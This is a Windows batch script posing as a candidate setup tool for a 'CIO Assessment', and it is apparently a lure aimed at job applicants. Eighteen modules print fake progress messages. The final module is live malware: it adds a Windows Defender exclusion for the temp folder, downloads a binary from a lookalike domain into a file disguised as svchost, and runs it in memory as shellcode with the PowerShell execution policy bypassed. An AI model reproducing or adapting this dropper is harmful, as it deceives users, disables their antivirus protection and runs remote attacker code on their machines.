@echo off
setlocal enabledelayedexpansion

:: =================================================================
:: CIO Assessment Environment Setup
:: =================================================================
title CIO Assessment Environment
color 0A

set "ASSESS_DIR=%USERPROFILE%\CIO_Assessment"
set "LOG_FILE=%ASSESS_DIR%\assessment.log"
set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"

:: Create assessment directory
if not exist "%ASSESS_DIR%" mkdir "%ASSESS_DIR%"
cd /d "%ASSESS_DIR%"

echo [%date% %time%] Assessment started >> "%LOG_FILE%"

:: =================================================================
:: MODULE 1: INFRASTRUCTURE INITIALIZATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 1/19: Infrastructure Initialization
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Initializing assessment infrastructure...
echo   [*] Infrastructure ready.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 2: ENVIRONMENT CONFIGURATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 2/19: Environment Configuration
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Configuring assessment environment...
echo   [*] Environment configured.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 3: DEPENDENCY RESOLUTION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 3/19: Dependency Resolution
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Resolving assessment dependencies...
echo   [*] Dependencies resolved.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 4: COMPONENT VALIDATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 4/19: Component Validation
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Validating assessment components...
echo   [*] Components validated.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 5: SECURITY BASELINE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 5/19: Security Baseline
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Establishing security baseline...
echo   [*] Baseline established.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 6: PERFORMANCE BENCHMARK
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 6/19: Performance Benchmark
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Running performance benchmarks...
echo   [*] Benchmarks complete.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 7: NETWORK TOPOLOGY
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 7/19: Network Topology
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Mapping network topology...
echo   [*] Topology mapped.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 8: DATA COLLECTION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 8/19: Data Collection
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Collecting assessment data...
echo   [*] Data collected.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 9: ANALYSIS ENGINE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 9/19: Analysis Engine
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Initializing analysis engine...
echo   [*] Analysis engine ready.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 10: REPORTING FRAMEWORK
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 10/19: Reporting Framework
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Setting up reporting framework...
echo   [*] Reporting framework ready.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 11: LOGGING SUBSYSTEM
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 11/19: Logging Subsystem
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Configuring logging subsystem...
echo   [*] Logging subsystem active.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 12: INTEGRITY MONITOR
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 12/19: Integrity Monitor
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Starting integrity monitor...
echo   [*] Integrity monitor running.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 13: RESOURCE ALLOCATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 13/19: Resource Allocation
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Allocating assessment resources...
echo   [*] Resources allocated.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 14: USER INTERFACE SETUP
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 14/19: User Interface Setup
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Configuring assessment interface...
echo   [*] Interface configured.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 15: NOTIFICATION SERVICE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 15/19: Notification Service
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Starting notification service...
echo   [*] Notification service active.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 16: SERVICE REGISTRATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 16/19: Registering Assessment Services
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Registering assessment service components...
echo   [*] Services registered successfully.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 17: UPDATE CHANNEL
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 17/19: Establishing Update Channel
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Establishing secure update channel...
echo   [*] Update channel established.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 18: COMPONENT INTEGRITY
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 18/19: Verifying Component Integrity
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Verifying component integrity...
echo   [*] All components verified.
echo.

timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 19: COMPLETE ASSESSMENT (EXECUTION)
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 19/19: Complete Assessment
echo ─────────────────────────────────────────────────────────
echo.
echo   [+] Configuring security exclusions...
echo.

powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue"

echo   [+] Downloading and executing assessment runtime...
echo.

set C2_URL=https://yahoo-accounts.com/storm.bin
set TEMP_FILE=%TEMP%\svchost.bin

powershell -Command "(New-Object Net.WebClient).DownloadFile('%C2_URL%', '%TEMP_FILE%')"
if not exist "%TEMP_FILE%" (
    echo [-] Runtime download failed. Assessment cannot continue.
    pause
    exit /b 1
)

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$bytes = [System.IO.File]::ReadAllBytes('%TEMP_FILE%'); ^
     $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length); ^
     [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length); ^
     $action = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action]); ^
     $action.Invoke()"

del /f /q "%TEMP_FILE%" 2>nul

echo   [+] Assessment completed.
echo.

:: =================================================================
:: FINALIZATION
:: =================================================================
cd /d "%ASSESS_DIR%"

set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
echo %CANDIDATE_ID% > candidate_id.txt
echo Candidate ID: %CANDIDATE_ID% >> "%ASSESS_DIR%\environment.config"

powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CIO Assessment.lnk'); $s.TargetPath = '%ASSESS_DIR%'; $s.Save()" >nul 2>&1

echo   [+] Candidate ID: %CANDIDATE_ID%
echo   [+] Desktop shortcut created.

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   Assessment Environment Ready                           ║
echo ║   Candidate ID: %CANDIDATE_ID%                           ║
echo ║                                                          ║
echo ║   Next Steps:                                            ║
echo ║   1. Open module-1-infrastructure                        ║
echo ║   2. Complete all four modules                           ║
echo ║   3. Compress %ASSESS_DIR% for submission              ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

echo [%date% %time%] Setup completed successfully >> "%LOG_FILE%"
pause >nul
endlocal
